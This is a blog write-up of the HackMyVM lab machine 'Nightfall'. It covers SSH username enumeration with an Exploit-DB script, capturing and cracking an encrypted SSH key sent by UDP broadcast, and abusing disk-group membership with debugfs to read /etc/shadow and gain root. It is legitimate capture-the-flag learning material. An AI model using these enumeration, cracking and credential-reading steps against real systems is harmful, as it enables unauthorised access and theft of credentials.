---
layout: post
title:  "HackMyVM: Nightfall/Nightfail"
date:   2022-02-04 12:00:00 +1100
category: hacking
---

I've done a couple more HackMyVM boxes and one thing on THM since I last wrote anything but I only want to write about one of them, and that's Nightfall from HMV.  

## Ports
FTP and SSH only: 

{% highlight shell %}
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 1001     1001          124 Jun 11  2021 darkness.txt
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
|_  256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
MAC Address: 08:00:27:F2:8B:49 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
{% endhighlight %}

I can't coax a version out of ProFTPD. It allows anonymous access with no writing, and contains one file with a somewhat cryptic hint:

>In the darkness, there are invisible things happening that can be seen by taking a closer look at the horizon as a whole

Hmmm ok I guess.

OpenSSH version 7.7 is vulnerable to username enumeration, and I use a python script from searchsploit to run it:

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# python enumerate.py --outputFile xato-usernames.out --userList /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt 10.10.10.72
{% endhighlight %}

The wordlist shown above is big - **624370** entries big. This takes a long time to run. I had already run the script with a much smaller list and found what I needed, but after stalling out I ran it again with the above entry. The python script, taken from [here](https://www.exploit-db.com/exploits/45233) writes every entry in the input to an output file (and only when the script completes) so that's kinda wierd. Anyway:

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# wc -l xato-usernames.out                                                 
624370 xato-usernames.out
                                                                                                                                                                                           
┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# cat xato-usernames.out | grep -v not
mail is a valid user!
root is a valid user!
news is a valid user!
man is a valid user!
bin is a valid user!
games is a valid user!
nobody is a valid user!
abraham is a valid user!
backup is a valid user!
daemon is a valid user!
proxy is a valid user!
list is a valid user!
sys is a valid user!
ftp is a valid user!
sync is a valid user!
irc is a valid user!
redis is a valid user!
{% endhighlight %}

The name we want is **abraham**. So, now what? We have two services only, one username and nothing else. I try a UDP port scan but get nothing. I guess it's bruteforcing either SSH or FTP with Hydra? I do try both of these approaches - nothing. I must be missing something? It turns out that yes, I am.

## Network
Since about the time I started doing HackMyVM boxes I've been running with an Internal Network mode in VirtualBox. I **used** to run everything Bridged even though I knew it wasn't really a good idea, and there was even a VulnHub [box](https://www.vulnhub.com/entry/worst-western-hotel-1,693/) called *WORST WESTERN HOTEL: 1* that said:

>Important: This box probably needs to be run in an isolated environment (Host-Only network), or it might disrupt your internal network. You should of course always run downloaded vm that way.

Incidentally that was a good box, not that I solved it but I did look at a write-up. What actually tipped me over the edge was a Windows VM that someone had made that they said (and I'm paraphrasing here):

**'lol, don't give this thing internet access'**. 

I've never had much success with Host Only since I'm running a Kali VM attackbox in a Windows Host, so Internal Network was the go. That gives me the ability to communicate freely between Kali and the victim, without either of them having access to the host or the internet. It's actually not hard to set up but you do need to use a CLI tool that comes with Virtualbox. It was basically this:

{% highlight powershell %}
C:\Program Files\Oracle\VirtualBox>vboxmanage dhcpserver add --netname testlab --ip 10.10.10.1 --netmask 255.255.255.0 --lowerip 10.10.10.2 --upperip 10.10.10.212 --enable

C:\Program Files\Oracle\VirtualBox>vboxmanage list dhcpservers
{% endhighlight %}

And then you just choose 'Internal Network' with the network name of 'testlab' for both machines. One of the nice things about VirtualBox is you can change the network adapter of the machine while it's running so if I want to download a script or whatever I can easily switch Kali to Bridged while it is running, do whatever is required, then switch back to Internal Network. Nice. This has all been working well....until now.

## The issue
Nightfall has **socat** doing a broadcast on UDP as a cronjob:

{% highlight shell %}
@reboot while true ; do cat /home/abraham/door.txt |socat - UDP-DATAGRAM:255.255.255.255:24000,broadcast ; done
{% endhighlight %}

The idea is that you can detect this with **tcpdump**, e.g. 

{% highlight shell %}
┌──(root💀kali)-[~]
└─# tcpdump host 192.168.1.145 and udp  
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
18:55:39.653742 IP 192.168.1.145.36604 > 255.255.255.255.24000: UDP, length 2294
18:55:39.654068 IP 192.168.1.145 > 255.255.255.255: udp
# etc, repeats
{% endhighlight %}

or **Wireshark**:

{% highlight shell %}
Frame 10: 858 bytes on wire (6864 bits), 858 bytes captured (6864 bits) on interface any, id 0
Linux cooked capture v1
Internet Protocol Version 4, Src: 192.168.1.145, Dst: 255.255.255.255
User Datagram Protocol, Src Port: 41754, Dst Port: 24000
Data (2294 bytes)
    Data: 553246736447566b58312b734f357a715035333375434b7446596f5345455534316a3031…
    [Length: 2294]
{% endhighlight %}

However, this **does not work** in Internal Network mode:

{% highlight shell %}
┌──(root💀kali)-[~]
└─# tcpdump host 10.10.10.72 and udp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
# lol, crickets
^C
0 packets captured
0 packets received by filter
0 packets dropped by kernel
{% endhighlight %}

Essentially this box can't be done with an Internal Network mode. Other modes may work (I'm not sure) but I switched it to Bridged to get it done. 

## What it means
The broadcast is the SSH private key of our user **abraham**, encrypted. It's basically [this](https://0xrick.github.io/hack-the-box/hawk/#decrypting-the-file), which is Hawk from HTB.

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# nc -nvlup 24000 > data.rec                                                                                             listening on [any] 24000 ...
connect to [192.168.1.210] from (UNKNOWN) [192.168.1.145] 39620

┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# cat data.rec | base64 -d > data.out                                                                                  
┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# file data.out    
data.out: openssl encd data with salted password
                               
┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# apt install bruteforce-salted-openssl                   
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  bruteforce-salted-openssl
0 upgraded, 1 newly installed, 0 to remove and 1 not upgraded.
Need to get 20.3 kB of archives.
After this operation, 55.3 kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 bruteforce-salted-openssl amd64 1.4.2-3 [20.3 kB]
Fetched 20.3 kB in 1s (22.4 kB/s)                     
Selecting previously unselected package bruteforce-salted-openssl.
(Reading database ... 377124 files and directories currently installed.)
Preparing to unpack .../bruteforce-salted-openssl_1.4.2-3_amd64.deb ...
Unpacking bruteforce-salted-openssl (1.4.2-3) ...
Setting up bruteforce-salted-openssl (1.4.2-3) ...
Processing triggers for man-db (2.9.4-4) ...
Processing triggers for kali-menu (2021.4.2) ...
Scanning processes...
Scanning linux images... 
Running kernel seems to be up-to-date.
No services need to be restarted.
No containers need to be restarted.
No user sessions are running outdated binaries.
                              
┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 data.out 
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
Tried passwords: 89937
Tried passwords per second: inf
Last tried password: am1234

Password candidate: amoajesus
                              
┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# openssl aes-256-cbc -d -in data.out -out data.txt -k amoajesus
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
                              
┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# cat data.txt                       
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4jJ321FfmddxmAyA+EUtxfMApwY32Zs1THtaWbU4jZ10Mzh8
# etc
{% endhighlight %}

Once we're on the box we are in the **disk** group which is basically [game over](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#disk-group):

{% highlight shell %}
abraham@nightfall:/$ /usr/sbin/debugfs
debugfs 1.44.5 (15-Dec-2018)
debugfs:  open /dev/sda1
debugfs:  cd /root
debugfs:  cat /etc/shadow
root:$6$cvC6xeyCAeGMOtO2$Vi6Eh # etc
{% endhighlight %}

In this case there is a root SSH key which we can read and use to SSH in:

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/nightfall]
└─# ssh -i root_key root@192.168.1.145
Last login: Sun Jun 20 11:42:37 2021 from 192.168.0.28
root@nightfall:~# id;hostname;date
uid=0(root) gid=0(root) groups=0(root)
nightfall
Fri 04 Feb 2022 01:10:02 AM CET
root@nightfall:~#
{% endhighlight %}

Also I 'upgraded' to Windows 11 (I had to switch to UEFI, MBR2GPT and enable TPM) and I'm not sure if I am pleased I did or not...
